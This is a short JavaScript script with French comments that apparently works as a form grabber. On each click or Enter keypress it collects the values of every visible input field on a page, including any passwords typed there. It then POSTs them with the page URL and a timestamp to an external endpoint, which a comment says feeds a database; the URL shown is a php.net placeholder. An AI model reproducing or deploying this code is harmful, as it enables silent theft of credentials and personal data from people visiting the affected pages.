function ajaxPost(url, data, callback, isJson) {
    var req = new XMLHttpRequest();
    req.open("POST", url);
    req.addEventListener("load", function () {
        if (req.status >= 200 && req.status < 400) {
            // Appelle la fonction callback en lui passant la réponse de la requête
            callback(req.responseText);
        } else {
            console.error(req.status + " " + req.statusText + " " + url);
        }
    });
    req.addEventListener("error", function () {
        console.error("Erreur réseau avec l'URL " + url);
    });
    if (isJson) {
        // Définit le contenu de la requête comme étant du JSON
        req.setRequestHeader("Content-Type", "application/json");
        // Transforme la donnée du format JSON vers le format texte avant l'envoi
        data = JSON.stringify(data);
    }
    req.send(data);
}
/* envoyer les datas a un script .php et tout envoyer sur la bdd */


myDataLast = [];

class MyApp {
  constructor(now) {
    this.date = [now.getDate()+"/"+(now.getMonth()+1)+"/"+(now.getYear()+1900)];
    this.heure = [now.getHours()+"h"+now.getMinutes()];
    this.site = document.location.href;;
    this.inputs = [];
  }

  listing() {
	var clef1000 = Array.prototype.slice.call(document.getElementsByTagName('input'),0);
	for (let clef9991=0; clef9991!=clef1000.length ; clef9991++){
		if (clef1000[clef9991].getAttribute("type") != "hidden"){
			(this.inputs).push(clef1000[clef9991].value);
		}
	}
  }

  decrire() {
    return `Le ${this.date} a ${this.heure}, le site : ${this.site} a était visité. \nIl contenait ces inputs: ${this.inputs}`;
  }

  output() {
  	return [this.date, this.heure, this.site, this.inputs];
  }
}

function comparaison(myDataFirst, myDataLast) {
	myDataFirst.toString();
	myDataLast.toString();
	let diff = (myDataFirst.toString() === myDataLast.toString());
	return diff;
}

function commun_event() {
	const myData = new MyApp(new Date());
	myData.listing();
	myDataFirst = myData.output();
	if (comparaison(myDataFirst, myDataLast) == false) {
		myDataLast = myDataFirst;
		if (myDataFirst[3].length>2) {
			console.log(myDataFirst);
			var monJSON = JSON.stringify(myDataFirst);
			ajaxPost("https://www.php.net/manual/fr/tutorial.firstpage.php", monJSON, function(){console.log('impex')}, true);
			console.log("all is good")
		}
	}
}

function event_click() {
	commun_event();
}

function event_enter() {
	if (event.keyCode == 13) {
		commun_event();
	}
}

document.addEventListener('click', event_click);
document.addEventListener("keydown", event_enter);
